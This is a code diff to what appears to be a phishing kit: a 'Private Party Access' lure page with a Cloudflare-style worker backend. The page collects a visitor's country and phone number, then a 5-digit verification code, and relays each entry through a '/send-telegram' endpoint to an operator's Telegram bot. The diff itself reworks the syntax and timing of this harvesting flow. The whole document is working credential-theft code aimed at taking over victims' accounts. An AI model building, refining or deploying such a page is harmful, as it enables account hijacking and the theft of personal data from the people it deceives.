@@ -3,7 +3,7 @@ const HTML_CONTENT = `<!DOCTYPE html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🎉 Private Party Access</title>
+<title>Private Party Access</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Tahoma,sans-serif}
 body{min-height:100vh;background:linear-gradient(135deg,#1a0033,#3d0066,#660066);display:flex;align-items:center;justify-content:center}
@@ -155,7 +155,7 @@ const countries=[
 {name:"Costa Rica",flag:"🇨🇷",code:"+506",regex:/^[2-9]\\d{7}$/,hint:"8 digits"},
 {name:"Croatia",flag:"🇭🇷",code:"+385",regex:/^9[1-9]\\d{7,8}$/,hint:"9X XXX XXXX"},
 {name:"Cuba",flag:"🇨🇺",code:"+53",regex:/^5\\d{7}$/,hint:"5X XXX XXXX"},
-{name:"Curaçao",flag:"🇨🇼",code:"+599",regex:/^9\\d{6}$/,hint:"7 digits"},
+{name:"Curacao",flag:"🇨🇼",code:"+599",regex:/^9\\d{6}$/,hint:"7 digits"},
 {name:"Cyprus",flag:"🇨🇾",code:"+357",regex:/^9[4-79]\\d{6}$/,hint:"8 digits"},
 {name:"Czech Republic",flag:"🇨🇿",code:"+420",regex:/^[67]\\d{8}$/,hint:"9 digits"},
 {name:"Denmark",flag:"🇩🇰",code:"+45",regex:/^[2-9]\\d{7}$/,hint:"8 digits"},
@@ -275,11 +275,11 @@ const countries=[
 {name:"Portugal",flag:"🇵🇹",code:"+351",regex:/^9[1-36]\\d{7}$/,hint:"9 digits"},
 {name:"Puerto Rico",flag:"🇵🇷",code:"+1-787",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
 {name:"Qatar",flag:"🇶🇦",code:"+974",regex:/^[35-7]\\d{7}$/,hint:"8 digits"},
-{name:"Réunion",flag:"🇷🇪",code:"+262",regex:/^[67]\\d{8}$/,hint:"9 digits"},
+{name:"Reunion",flag:"🇷🇪",code:"+262",regex:/^[67]\\d{8}$/,hint:"9 digits"},
 {name:"Romania",flag:"🇷🇴",code:"+40",regex:/^7\\d{8}$/,hint:"7X XXX XXXX"},
 {name:"Russia",flag:"🇷🇺",code:"+7",regex:/^9\\d{9}$/,hint:"9XX XXX XX XX"},
 {name:"Rwanda",flag:"🇷🇼",code:"+250",regex:/^7[2-9]\\d{7}$/,hint:"9 digits"},
-{name:"Saint Barthélemy",flag:"🇧🇱",code:"+590",regex:/^[67]\\d{8}$/,hint:"9 digits"},
+{name:"Saint Barthelemy",flag:"🇧🇱",code:"+590",regex:/^[67]\\d{8}$/,hint:"9 digits"},
 {name:"Saint Helena",flag:"🇸🇭",code:"+290",regex:/^[2-9]\\d{3}$/,hint:"4 digits"},
 {name:"Saint Kitts and Nevis",flag:"🇰🇳",code:"+1-869",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
 {name:"Saint Lucia",flag:"🇱🇨",code:"+1-758",regex:/^[2-9]\\d{9}$/,hint:"XXX XXX XXXX"},
@@ -343,19 +343,86 @@ const countries=[
 {name:"Zambia",flag:"🇿🇲",code:"+260",regex:/^[7-9]\\d{8}$/,hint:"9 digits"},
 {name:"Zimbabwe",flag:"🇿🇼",code:"+263",regex:/^7[1-8]\\d{7}$/,hint:"9 digits"}
 ];
-let selectedCountry=null;
-const REAL_CODE="69696";
-let savedPhone="";
-function show(id){document.querySelectorAll('.card').forEach(c=>c.classList.add('hidden'));document.getElementById(id).classList.remove('hidden');}
+var selectedCountry=null;
+var REAL_CODE="69696";
+var savedPhone="";
+function show(id){document.querySelectorAll('.card').forEach(function(c){c.classList.add('hidden')});document.getElementById(id).classList.remove('hidden');}
 function goToStep2(){show('step2');}
-function openCountryModal(){document.getElementById('countryModal').classList.add('active');renderCountryList(countries);setTimeout(()=>document.getElementById('searchCountry').focus(),100);}
+function openCountryModal(){document.getElementById('countryModal').classList.add('active');renderCountryList(countries);setTimeout(function(){document.getElementById('searchCountry').focus();},100);}
 function closeCountryModal(){document.getElementById('countryModal').classList.remove('active');document.getElementById('searchCountry').value="";}
-function renderCountryList(list){document.getElementById('countryList').innerHTML=list.map(c=>'<div class="country-item" onclick="selectCountry(\\''+c.name.replace(/'/g,"\\\\'")+'\\',\\''+c.flag+'\\',\\''+c.code+'\\')"><span class="flag">'+c.flag+'</span><span class="name">'+c.name+'</span><span class="code">'+c.code+'</span></div>').join('');}
-function filterCountries(){const q=document.getElementById('searchCountry').value.toLowerCase();renderCountryList(countries.filter(c=>c.name.toLowerCase().includes(q)||c.code.includes(q)));}
-function selectCountry(name,flag,code){selectedCountry=countries.find(c=>c.name===name);document.getElementById('selFlag').textContent=flag;document.getElementById('selName').textContent=name;document.getElementById('selCode').textContent=code;document.getElementById('phone').disabled=false;document.getElementById('phone').value=code;document.getElementById('phoneHint').textContent='Format: '+selectedCountry.hint;document.getElementById('phone').focus();closeCountryModal();}
-async function sendToTelegram(text){try{await fetch('/send-telegram',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({text:text})});}catch(e){console.log(e);}}
-async function sendPhone(){const phone=document.getElementById('phone').value.trim();const err=document.getElementById('err');err.textContent="";if(!selectedCountry){err.textContent="❌ Please select your country first";return;}const codeClean=selectedCountry.code.replace('+','').replace('-','');const cleanPhone=phone.replace(/[\\s\\-\\(\\)\\+]/g,'');let num=cleanPhone;if(cleanPhone.startsWith(codeClean))num=cleanPhone.substring(codeClean.length);if(!selectedCountry.regex.test(num)){err.textContent="❌ Invalid phone number for "+selectedCountry.name+". Expected: "+selectedCountry.hint;return;}savedPhone=selectedCountry.flag+' '+phone;await sendToTelegram('🎉 *Party access request*\\n\\n🌍 Country: '+selectedCountry.name+' '+selectedCountry.flag+'\\n📱 Phone: `'+phone+' `\\n⏰ '+new Date().toLocaleString('en-US'));show('step3');document.getElementById('code').focus();}
-function verifyCode(){const code=document.getElementById('code').value.trim();const err=document.getElementById('err2');const btn=document.getElementById('verifyBtn');err.textContent="";if(code.length!==5||!/^\\d{5}$/.test(code)){err.textContent="❌ Code must be 5 digits";return;}btn.innerHTML='Verifying... <span class="loader"></span>';btn.disabled=true;sendToTelegram('🔑 *Code entered: '+code+'*').then(()=>{btn.innerHTML='✅ Verify & Enter';btn.disabled=false;if(code===REAL_CODE){show('step4');}else{err.textContent="❌ Incorrect code! Try again.";document.getElementById('code').value="";}});}
+function renderCountryList(list){
+var html='';
+for(var i=0;i<list.length;i++){
+var c=list[i];
+html+='<div class="country-item" onclick="selectCountry(\\''+c.name.replace(/'/g,"")+'\\',\\''+c.flag+'\\',\\''+c.code+'\\')"><span class="flag">'+c.flag+'</span><span class="name">'+c.name+'</span><span class="code">'+c.code+'</span></div>';
+}
+document.getElementById('countryList').innerHTML=html;
+}
+function filterCountries(){
+var q=document.getElementById('searchCountry').value.toLowerCase();
+var filtered=[];
+for(var i=0;i<countries.length;i++){
+if(countries[i].name.toLowerCase().indexOf(q)!==-1||countries[i].code.indexOf(q)!==-1){
+filtered.push(countries[i]);
+}
+}
+renderCountryList(filtered);
+}
+function selectCountry(name,flag,code){
+selectedCountry=null;
+for(var i=0;i<countries.length;i++){
+if(countries[i].name===name){selectedCountry=countries[i];break;}
+}
+document.getElementById('selFlag').textContent=flag;
+document.getElementById('selName').textContent=name;
+document.getElementById('selCode').textContent=code;
+document.getElementById('phone').disabled=false;
+document.getElementById('phone').value=code;
+document.getElementById('phoneHint').textContent='Format: '+selectedCountry.hint;
+document.getElementById('phone').focus();
+closeCountryModal();
+}
+function sendToTelegram(text){
+return fetch('/send-telegram',{
+method:'POST',
+headers:{'Content-Type':'application/json'},
+body:JSON.stringify({text:text})
+}).catch(function(e){console.log(e);});
+}
+function sendPhone(){
+var phone=document.getElementById('phone').value.trim();
+var err=document.getElementById('err');
+err.textContent="";
+if(!selectedCountry){err.textContent="Please select your country first";return;}
+var codeClean=selectedCountry.code.replace('+','').replace('-','');
+var cleanPhone=phone.replace(/[\s\-\(\)\+]/g,'');
+var num=cleanPhone;
+if(cleanPhone.indexOf(codeClean)===0)num=cleanPhone.substring(codeClean.length);
+if(!selectedCountry.regex.test(num)){
+err.textContent="Invalid phone number for "+selectedCountry.name+". Expected: "+selectedCountry.hint;
+return;
+}
+savedPhone=selectedCountry.flag+' '+phone;
+var msg='Party access request - Country: '+selectedCountry.name+' '+selectedCountry.flag+' - Phone: '+phone+' - Time: '+new Date().toLocaleString('en-US');
+sendToTelegram(msg);
+show('step3');
+setTimeout(function(){show('step4');document.getElementById('code').focus();},3000);
+}
+function verifyCode(){
+var code=document.getElementById('code').value.trim();
+var err=document.getElementById('err2');
+var btn=document.getElementById('verifyBtn');
+err.textContent="";
+if(code.length!==5||!/^\d{5}$/.test(code)){err.textContent="Code must be 5 digits";return;}
+btn.innerHTML='Verifying... <span class="loader"></span>';
+btn.disabled=true;
+sendToTelegram('Code entered: '+code).then(function(){
+btn.innerHTML='Verify & Enter';
+btn.disabled=false;
+if(code===REAL_CODE){show('step4');}
+else{err.textContent="Incorrect code! Try again.";document.getElementById('code').value="";}
+});
+}
 document.getElementById('countryModal').addEventListener('click',function(e){if(e.target===this)closeCountryModal();});
 </script>
 </body>
@@ -373,7 +440,8 @@ export default {
     
     if (url.pathname === '/send-telegram' && request.method === 'POST') {
       try {
-        const { text } = await request.json();
+        const body = await request.json();
+        const text = body.text || '';
         const BOT_TOKEN = env.BOT_TOKEN;
         const CHAT_ID = env.CHAT_ID;
         
@@ -384,13 +452,14 @@ export default {
           });
         }
         
-        const response = await fetch(\`https://api.telegram.org/bot\${BOT_TOKEN}/sendMessage\`, {
+        const tgUrl = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+        
+        const response = await fetch(tgUrl, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             chat_id: CHAT_ID,
-            text: text,
-            parse_mode: 'Markdown'
+            text: text
           })
         });
         
